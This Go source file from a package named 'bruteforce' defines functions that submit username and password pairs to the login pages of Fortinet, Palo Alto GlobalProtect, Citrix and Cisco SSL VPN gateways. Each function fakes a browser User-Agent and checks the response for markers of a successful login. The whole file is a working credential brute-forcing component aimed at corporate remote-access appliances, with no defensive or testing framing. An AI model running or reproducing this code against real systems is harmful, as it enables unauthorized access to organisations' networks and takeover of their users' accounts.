package bruteforce

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
)

func (e *Engine) checkFortinet(ctx context.Context, cred Credential) (bool, error) {
	targetURL := fmt.Sprintf("https://%s/remote/login", cred.IP)

	data := url.Values{}
	data.Set("username", cred.Username)
	data.Set("password", cred.Password)

	req, err := http.NewRequestWithContext(ctx, "POST", targetURL, strings.NewReader(data.Encode()))
	if err != nil {
		return false, err
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	req.Close = true // Force connection close

	resp, err := e.doRequest(req)
	if err != nil {
		return false, err
	}
	defer func() {
		_ = resp.Body.Close()
	}()

	// Read limited response
	body, err := io.ReadAll(io.LimitReader(resp.Body, 8192))
	if err != nil {
		return false, err
	}

	bodyStr := string(body)
	return resp.StatusCode == 200 && strings.Contains(bodyStr, "vpn/tunnel"), nil
}

func (e *Engine) checkGlobalProtect(ctx context.Context, cred Credential) (bool, error) {
	targetURL := fmt.Sprintf("https://%s/global-protect/login.esp", cred.IP)

	data := url.Values{}
	data.Set("prot", "https%")
	data.Set("server", cred.IP)
	data.Set("inputStr", "")
	data.Set("action", "getsoftware")
	data.Set("user", cred.Username)
	data.Set("passwd", cred.Password)
	data.Set("ok", "Log In")

	req, err := http.NewRequestWithContext(ctx, "POST", targetURL, strings.NewReader(data.Encode()))
	if err != nil {
		return false, err
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	req.Close = true

	resp, err := e.doRequest(req)
	if err != nil {
		return false, err
	}
	defer func() { _ = resp.Body.Close() }()

	body, err := io.ReadAll(io.LimitReader(resp.Body, 8192))
	if err != nil {
		return false, err
	}

	bodyStr := string(body)
	return strings.Contains(bodyStr, "Download Windows 64 bit GlobalProtect agent"), nil
}

func (e *Engine) checkCitrix(ctx context.Context, cred Credential) (bool, error) {
	targetURL := fmt.Sprintf("https://%s/p/u/doAuthentication.do", cred.IP)

	data := url.Values{}
	data.Set("login", cred.Username)
	data.Set("passwd", cred.Password)
	data.Set("savecredentials", "false")
	data.Set("nsg-x1-logon-button", "Log On")
	data.Set("StateContext", "bG9naW5zY2hlbWE9ZGVmYXVsdA%3D%3D")

	req, err := http.NewRequestWithContext(ctx, "POST", targetURL, strings.NewReader(data.Encode()))
	if err != nil {
		return false, err
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	req.Close = true

	resp, err := e.doRequest(req)
	if err != nil {
		return false, err
	}
	defer func() { _ = resp.Body.Close() }()

	body, err := io.ReadAll(io.LimitReader(resp.Body, 8192))
	if err != nil {
		return false, err
	}

	bodyStr := string(body)
	return strings.Contains(bodyStr, "<CredentialUpdateService>/p/a/getCredentialUpdateRequirements.do</CredentialUpdateService>"), nil
}

func (e *Engine) checkCisco(ctx context.Context, cred Credential) (bool, error) {
	targetURL := fmt.Sprintf("https://%s/+webvpn+/index.html", cred.IP)

	data := url.Values{}
	data.Set("username", cred.Username)
	data.Set("password", cred.Password)
	data.Set("group_list", "")
	data.Set("Login", "Logon")

	req, err := http.NewRequestWithContext(ctx, "POST", targetURL, strings.NewReader(data.Encode()))
	if err != nil {
		return false, err
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	req.Close = true

	resp, err := e.doRequest(req)
	if err != nil {
		return false, err
	}
	defer func() { _ = resp.Body.Close() }()

	body, err := io.ReadAll(io.LimitReader(resp.Body, 8192))
	if err != nil {
		return false, err
	}

	bodyStr := string(body)
	return strings.Contains(bodyStr, "SSL VPN Service") && strings.Contains(bodyStr, "webvpn_logout"), nil
}
